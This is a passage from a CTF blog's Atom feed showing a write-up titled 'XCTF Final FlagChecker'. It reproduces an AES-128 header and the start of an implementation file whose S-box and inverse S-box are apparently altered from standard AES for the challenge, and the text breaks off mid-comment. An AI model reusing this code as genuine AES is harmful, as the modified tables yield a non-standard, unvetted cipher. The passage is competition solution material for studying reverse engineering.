<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liv&#39;s blog</title>
  
  <subtitle>CTF blog</subtitle>
  <link href="https://tkazer.github.io/atom.xml" rel="self"/>
  
  <link href="https://tkazer.github.io/"/>
  <updated>2025-10-26T14:43:53.691Z</updated>
  <id>https://tkazer.github.io/</id>
  
  <author>
    <name>Liv</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XCTF Final FlagChecker</title>
    <link href="https://tkazer.github.io/2025/10/26/XCTF-Final-FlagChecker/"/>
    <id>https://tkazer.github.io/2025/10/26/XCTF-Final-FlagChecker/</id>
    <published>2025-10-26T14:39:23.000Z</published>
    <updated>2025-10-26T14:43:53.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-Final-FlagChecker"><a href="#XCTF-Final-FlagChecker" class="headerlink" title="XCTF Final FlagChecker"></a>XCTF Final FlagChecker</h1><p>aes.h</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Chinese Academy of Sciences</span></span><br><span class="line"><span class="comment"> * State Key Laboratory of Information Security</span></span><br><span class="line"><span class="comment"> * Institute of Information Engineering</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Copyright (C) 2016 Chinese Academy of Sciences</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * LuoPeng, luopeng@iie.ac.cn</span></span><br><span class="line"><span class="comment"> * Updated in May 2016</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> AES_128_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AES_128_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AES_BLOCK_SIZE      16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AES_ROUNDS          10  <span class="comment">// 12, 14</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AES_ROUND_KEY_SIZE  176 <span class="comment">// AES-128 has 10 rounds, and there is a AddRoundKey before first round. (10+1)x16=176.</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @purpose:            Key schedule for AES-128</span></span><br><span class="line"><span class="comment"> * @par[in]key:         16 bytes of master keys</span></span><br><span class="line"><span class="comment"> * @par[out]roundkeys:  176 bytes of round keys</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_key_schedule_128</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint8_t</span> *roundkeys)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @purpose:            Encryption. The length of plain and cipher should be one block (16 bytes).</span></span><br><span class="line"><span class="comment"> *                      The plaintext and ciphertext may point to the same memory</span></span><br><span class="line"><span class="comment"> * @par[in]roundkeys:   round keys</span></span><br><span class="line"><span class="comment"> * @par[in]plaintext:   plain text</span></span><br><span class="line"><span class="comment"> * @par[out]ciphertext: cipher text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_encrypt_128</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *roundkeys, <span class="type">const</span> <span class="type">uint8_t</span> *plaintext, <span class="type">uint8_t</span> *ciphertext)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @purpose:            Decryption. The length of plain and cipher should be one block (16 bytes).</span></span><br><span class="line"><span class="comment"> *                      The ciphertext and plaintext may point to the same memory</span></span><br><span class="line"><span class="comment"> * @par[in]roundkeys:   round keys</span></span><br><span class="line"><span class="comment"> * @par[in]ciphertext:  cipher text</span></span><br><span class="line"><span class="comment"> * @par[out]plaintext:  plain text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_decrypt_128</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *roundkeys, <span class="type">const</span> <span class="type">uint8_t</span> *ciphertext, <span class="type">uint8_t</span> *plaintext)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>aes.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Chinese Academy of Sciences</span></span><br><span class="line"><span class="comment"> * State Key Laboratory of Information Security</span></span><br><span class="line"><span class="comment"> * Institute of Information Engineering</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Copyright (C) 2016 Chinese Academy of Sciences</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * LuoPeng, luopeng@iie.ac.cn</span></span><br><span class="line"><span class="comment"> * Updated in Oct 2016</span></span><br><span class="line"><span class="comment"> * Updated in Jan 2017, update muliple function on GF(2^8).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;aes.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * round constants</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> RC[] = &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Sbox</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> SBOX[] = &#123;</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x5F</span>, <span class="number">0xA0</span>, <span class="number">0x00</span>, <span class="number">0x4E</span>, <span class="number">0xA3</span>, <span class="number">0x4F</span>, <span class="number">0xF3</span>, <span class="number">0x58</span>, <span class="number">0x76</span>, <span class="number">0x19</span>, <span class="number">0x83</span>, <span class="number">0x14</span>, <span class="number">0x12</span>, <span class="number">0x77</span>, <span class="number">0x9F</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x6A</span>, <span class="number">0x2D</span>, <span class="number">0x54</span>, <span class="number">0xB5</span>, <span class="number">0xE3</span>, <span class="number">0x02</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xC5</span>, <span class="number">0x6D</span>, <span class="number">0x57</span>, <span class="number">0xDD</span>, <span class="number">0x96</span>, <span class="number">0x5E</span>, <span class="number">0x2A</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x50</span>, <span class="number">0x8A</span>, <span class="number">0x0E</span>, <span class="number">0x60</span>, <span class="number">0x32</span>, <span class="number">0xF0</span>, <span class="number">0x4B</span>, <span class="number">0x53</span>, <span class="number">0x2B</span>, <span class="number">0x4D</span>, <span class="number">0x7F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0xB9</span>, <span class="number">0x8F</span>,</span><br><span class="line">    <span class="number">0xCE</span>, <span class="number">0x6C</span>, <span class="number">0x81</span>, <span class="number">0xD7</span>, <span class="number">0xCD</span>, <span class="number">0xDB</span>, <span class="number">0x5B</span>, <span class="number">0x5C</span>, <span class="number">0xC9</span>, <span class="number">0xED</span>, <span class="number">0x29</span>, <span class="number">0x63</span>, <span class="number">0xC8</span>, <span class="number">0xB3</span>, <span class="number">0xF1</span>, <span class="number">0x30</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0xBD</span>, <span class="number">0x8D</span>, <span class="number">0xBA</span>, <span class="number">0x91</span>, <span class="number">0x42</span>, <span class="number">0xF7</span>, <span class="number">0xB7</span>, <span class="number">0x82</span>, <span class="number">0x35</span>, <span class="number">0x5A</span>, <span class="number">0x3A</span>, <span class="number">0xD5</span>, <span class="number">0x2C</span>, <span class="number">0xD0</span>, <span class="number">0x7E</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0xA7</span>, <span class="number">0x49</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x13</span>, <span class="number">0xA1</span>, <span class="number">0x21</span>, <span class="number">0xCC</span>, <span class="number">0x27</span>, <span class="number">0x48</span>, <span class="number">0x34</span>, <span class="number">0x11</span>, <span class="number">0xBC</span>, <span class="number">0xCF</span>, <span class="number">0x9B</span>,</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0x20</span>, <span class="number">0xE4</span>, <span class="number">0x97</span>, <span class="number">0x40</span>, <span class="number">0x9E</span>, <span class="number">0xB6</span>, <span class="number">0x1A</span>, <span class="number">0x08</span>, <span class="number">0x65</span>, <span class="number">0x1B</span>, <span class="number">0x5D</span>, <span class="number">0x3E</span>, <span class="number">0x70</span>, <span class="number">0xE1</span>, <span class="number">0xC2</span>,</span><br><span class="line">    <span class="number">0x3D</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0x75</span>, <span class="number">0x0C</span>, <span class="number">0xFC</span>, <span class="number">0xC3</span>, <span class="number">0x23</span>, <span class="number">0xEE</span>, <span class="number">0xF6</span>, <span class="number">0x1F</span>, <span class="number">0xAD</span>, <span class="number">0x01</span>, <span class="number">0x1D</span>, <span class="number">0x85</span>, <span class="number">0xDC</span>,</span><br><span class="line">    <span class="number">0x37</span>, <span class="number">0x64</span>, <span class="number">0xAE</span>, <span class="number">0x9C</span>, <span class="number">0xB4</span>, <span class="number">0x8C</span>, <span class="number">0xFD</span>, <span class="number">0x74</span>, <span class="number">0x7A</span>, <span class="number">0x1E</span>, <span class="number">0xF4</span>, <span class="number">0x1C</span>, <span class="number">0x0A</span>, <span class="number">0x51</span>, <span class="number">0x3C</span>, <span class="number">0x16</span>,</span><br><span class="line">    <span class="number">0x38</span>, <span class="number">0x3B</span>, <span class="number">0xA8</span>, <span class="number">0x43</span>, <span class="number">0xA9</span>, <span class="number">0x78</span>, <span class="number">0xE7</span>, <span class="number">0xC6</span>, <span class="number">0x95</span>, <span class="number">0xCB</span>, <span class="number">0x90</span>, <span class="number">0xE2</span>, <span class="number">0xD4</span>, <span class="number">0x87</span>, <span class="number">0x71</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0x41</span>, <span class="number">0x17</span>, <span class="number">0x4A</span>, <span class="number">0x79</span>, <span class="number">0xF8</span>, <span class="number">0xDF</span>, <span class="number">0x26</span>, <span class="number">0x10</span>, <span class="number">0x92</span>, <span class="number">0x86</span>, <span class="number">0xC0</span>, <span class="number">0xB2</span>, <span class="number">0x04</span>, <span class="number">0x0B</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x7D</span>, <span class="number">0xB0</span>, <span class="number">0x68</span>, <span class="number">0xAF</span>, <span class="number">0x09</span>, <span class="number">0xE9</span>, <span class="number">0xEB</span>, <span class="number">0xD9</span>, <span class="number">0xD8</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x8E</span>, <span class="number">0xF2</span>, <span class="number">0xAB</span>, <span class="number">0xEA</span>, <span class="number">0x06</span>,</span><br><span class="line">    <span class="number">0xA5</span>, <span class="number">0xF5</span>, <span class="number">0xD1</span>, <span class="number">0x62</span>, <span class="number">0x18</span>, <span class="number">0x99</span>, <span class="number">0x6B</span>, <span class="number">0x39</span>, <span class="number">0x25</span>, <span class="number">0x7B</span>, <span class="number">0xB1</span>, <span class="number">0x46</span>, <span class="number">0xE6</span>, <span class="number">0x88</span>, <span class="number">0x7C</span>, <span class="number">0x69</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0x84</span>, <span class="number">0x0D</span>, <span class="number">0x31</span>, <span class="number">0x4C</span>, <span class="number">0xD2</span>, <span class="number">0xE5</span>, <span class="number">0xEC</span>, <span class="number">0x59</span>, <span class="number">0xC7</span>, <span class="number">0xDE</span>, <span class="number">0x2E</span>, <span class="number">0x9D</span>, <span class="number">0x28</span>, <span class="number">0x94</span>, <span class="number">0xA2</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0xCA</span>, <span class="number">0x2F</span>, <span class="number">0xBE</span>, <span class="number">0x67</span>, <span class="number">0xD3</span>, <span class="number">0x15</span>, <span class="number">0x07</span>, <span class="number">0xFA</span>, <span class="number">0xA4</span>, <span class="number">0xFF</span>, <span class="number">0x6F</span>, <span class="number">0xAA</span>, <span class="number">0xC1</span>, <span class="number">0x56</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x93</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0xD6</span>, <span class="number">0x9A</span>, <span class="number">0xE0</span>, <span class="number">0xFE</span>, <span class="number">0xBB</span>, <span class="number">0x80</span>, <span class="number">0x03</span>, <span class="number">0xC4</span>, <span class="number">0xFB</span>, <span class="number">0xBF</span>, <span class="number">0xEF</span>, <span class="number">0x24</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Inverse Sboxs</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> INV_SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line">   <span class="number">0x03</span>,<span class="number">0x7C</span>,<span class="number">0x16</span>,<span class="number">0xFA</span>,<span class="number">0xAD</span>,<span class="number">0x71</span>,<span class="number">0xBF</span>,<span class="number">0xE7</span>,<span class="number">0x68</span>,<span class="number">0xB4</span>,<span class="number">0x8C</span>,<span class="number">0xAE</span>,<span class="number">0x74</span>,<span class="number">0xD2</span>,<span class="number">0x23</span>,<span class="number">0xE0</span>,<span class="number">0xA8</span>,<span class="number">0x5C</span>,<span class="number">0x0D</span>,<span class="number">0x55</span>,<span class="number">0x0C</span>,<span class="number">0xE6</span>,<span class="number">0x8F</span>,<span class="number">0xA2</span>,<span class="number">0xC4</span>,<span class="number">0x0A</span>,<span class="number">0x67</span>,<span class="number">0x6A</span>,<span class="number">0x8B</span>,<span class="number">0x7D</span>,<span class="number">0x89</span>,<span class="number">0x7A</span>,<span class="number">0x61</span>,<span class="number">0x57</span>,<span class="number">0x20</span>,<span class="number">0x77</span>,<span class="number">0xFF</span>,<span class="number">0xC8</span>,<span class="number">0xA7</span>,<span class="number">0x59</span>,<span class="number">0xDD</span>,<span class="number">0x3A</span>,<span class="number">0x1F</span>,<span class="number">0x29</span>,<span class="number">0x4D</span>,<span class="number">0x12</span>,<span class="number">0xDB</span>,<span class="number">0xE2</span>,<span class="number">0x3F</span>,<span class="number">0xD3</span>,<span class="number">0x25</span>,<span class="number">0x50</span>,<span class="number">0x5B</span>,<span class="number">0x49</span>,<span class="number">0x00</span>,<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0xC7</span>,<span class="number">0x4B</span>,<span class="number">0x91</span>,<span class="number">0x8E</span>,<span class="number">0x70</span>,<span class="number">0x6C</span>,<span class="number">0x2C</span>,<span class="number">0x64</span>,<span class="number">0xA1</span>,<span class="number">0x45</span>,<span class="number">0x93</span>,<span class="number">0xB9</span>,<span class="number">0xBA</span>,<span class="number">0xCB</span>,<span class="number">0x40</span>,<span class="number">0x5A</span>,<span class="number">0x52</span>,<span class="number">0xA3</span>,<span class="number">0x27</span>,<span class="number">0xD4</span>,<span class="number">0x2A</span>,<span class="number">0x04</span>,<span class="number">0x06</span>,<span class="number">0x21</span>,<span class="number">0x8D</span>,<span class="number">0x10</span>,<span class="number">0x28</span>,<span class="number">0x13</span>,<span class="number">0xF0</span>,<span class="number">0xEE</span>,<span class="number">0x1B</span>,<span class="number">0x08</span>,<span class="number">0xD8</span>,<span class="number">0x4A</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x6B</span>,<span class="number">0x1E</span>,<span class="number">0x01</span>,<span class="number">0x24</span>,<span class="number">0x54</span>,<span class="number">0xC3</span>,<span class="number">0x3B</span>,<span class="number">0x81</span>,<span class="number">0x69</span>,<span class="number">0xF2</span>,<span class="number">0xE4</span>,<span class="number">0xB2</span>,<span class="number">0xCF</span>,<span class="number">0x11</span>,<span class="number">0xC6</span>,<span class="number">0x31</span>,<span class="number">0x1A</span>,<span class="number">0x9F</span>,<span class="number">0xEB</span>,<span class="number">0x6D</span>,<span class="number">0x9E</span>,<span class="number">0xD0</span>,<span class="number">0xF3</span>,<span class="number">0x87</span>,<span class="number">0x73</span>,<span class="number">0x09</span>,<span class="number">0x0E</span>,<span class="number">0x95</span>,<span class="number">0xA4</span>,<span class="number">0x88</span>,<span class="number">0xC9</span>,<span class="number">0xCE</span>,<span class="number">0xB0</span>,<span class="number">0x4F</span>,<span class="number">0x2B</span>,<span class="number">0xF9</span>,<span class="number">0x32</span>,<span class="number">0x48</span>,<span class="number">0x0B</span>,<span class="number">0xD1</span>,<span class="number">0x7E</span>,<span class="number">0xAA</span>,<span class="number">0x9D</span>,<span class="number">0xCD</span>,<span class="number">0xAF</span>,<span class="number">0x22</span>,<span class="number">0x18</span>,<span class="number">0x85</span>,<span class="number">0x42</span>,<span class="number">0xBB</span>,<span class="number">0x2F</span>,<span class="number">0x9A</span>,<span class="number">0x44</span>,<span class="number">0xA9</span>,<span class="number">0xF1</span>,<span class="number">0xDE</span>,<span class="number">0x98</span>,<span class="number">0x1D</span>,<span class="number">0x63</span>,<span class="number">0xEF</span>,<span class="number">0xC5</span>,<span class="number">0xF5</span>,<span class="number">0x5F</span>,<span class="number">0x83</span>,<span class="number">0xDC</span>,<span class="number">0x65</span>,<span class="number">0x0F</span>,<span class="number">0x02</span>,<span class="number">0x56</span>,<span class="number">0xDF</span>,<span class="number">0x05</span>,<span class="number">0xE9</span>,<span class="number">0xC0</span>,<span class="number">0x2D</span>,<span class="number">0x51</span>,<span class="number">0x92</span>,<span class="number">0x94</span>,<span class="number">0xEC</span>,<span class="number">0xBD</span>,<span class="number">0x60</span>,<span class="number">0x7B</span>,<span class="number">0x82</span>,<span class="number">0xB3</span>,<span class="number">0xB1</span>,<span class="number">0xCA</span>,<span class="number">0xAC</span>,<span class="number">0x3D</span>,<span class="number">0x84</span>,<span class="number">0x14</span>,<span class="number">0x66</span>,<span class="number">0x47</span>,<span class="number">0x72</span>,<span class="number">0x2E</span>,<span class="number">0x43</span>,<span class="number">0xF8</span>,<span class="number">0x5D</span>,<span class="number">0x41</span>,<span class="number">0xE3</span>,<span class="number">0xFD</span>,<span class="number">0xAB</span>,<span class="number">0xED</span>,<span class="number">0x6F</span>,<span class="number">0x76</span>,<span class="number">0xFB</span>,<span class="number">0x19</span>,<span class="number">0x97</span>,<span class="number">0xD9</span>,<span class="number">0x3C</span>,<span class="number">0x38</span>,<span class="number">0xE1</span>,<span class="number">0x99</span>,<span class="number">0x58</span>,<span class="number">0x34</span>,<span class="number">0x30</span>,<span class="number">0x5E</span>,<span class="number">0x4E</span>,<span class="number">0xC2</span>,<span class="number">0xD5</span>,<span class="number">0xE5</span>,<span class="number">0x9C</span>,<span class="number">0x4C</span>,<span class="number">0xF4</span>,<span class="number">0x33</span>,<span class="number">0xB8</span>,<span class="number">0xB7</span>,<span class="number">0x17</span>,<span class="number">0x35</span>,<span class="number">0x7F</span>,<span class="number">0x1C</span>,<span class="number">0xDA</span>,<span class="number">0xA6</span>,<span class="number">0xF6</span>,<span class="number">0x6E</span>,<span class="number">0x9B</span>,<span class="number">0x15</span>,<span class="number">0x62</span>,<span class="number">0xD6</span>,<span class="number">0xCC</span>,<span class="number">0x96</span>,<span class="number">0xA0</span>,<span class="number">0xB5</span>,<span class="number">0xBE</span>,<span class="number">0xB6</span>,<span class="number">0xD7</span>,<span class="number">0x39</span>,<span class="number">0x78</span>,<span class="number">0xFE</span>,<span class="number">0x26</span>,<span class="number">0x3E</span>,<span class="number">0xBC</span>,<span class="number">0x07</span>,<span class="number">0x8A</span>,<span class="number">0xC1</span>,<span class="number">0x79</span>,<span class="number">0x46</span>,<span class="number">0xA5</span>,<span class="number">0x53</span>,<span class="number">0xE8</span>,<span class="number">0xFC</span>,<span class="number">0x75</span>,<span class="number">0x86</span>,<span class="number">0xF7</span>,<span class="number">0xEA</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * https://en.wikipedia.org/wiki/Finite_field_arithmetic</span></span><br><span class="line"><span class="comment"> * Multiply two numbers in the GF(2^8) finite field defined</span></span><br><span class="line"><span class="comment"> * by the polynomial x^8 + x^4 + x^3 + x + 1 = 0</span></span><br><span class="line"><span class="comment"> * We do use mul2(int8_t a) but not mul(uint8_t a, uint8_t b)</span></span><br><span class="line"><span class="comment"> * just in order to get a higher speed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint8_t</span> <span class="title">mul2</span><span class="params">(<span class="type">uint8_t</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a&amp;<span class="number">0x80</span>) ? ((a&lt;&lt;<span class="number">1</span>)^<span class="number">0x1b</span>) : (a&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @purpose:    ShiftRows</span></span><br><span class="line"><span class="comment"> * @descrption:</span></span><br><span class="line"><span class="comment"> *  Row0: s0  s4  s8  s12   &lt;&lt;&lt; 0 byte</span></span><br><span class="line"><span class="comment"> *  Row1: s1  s5  s9  s13   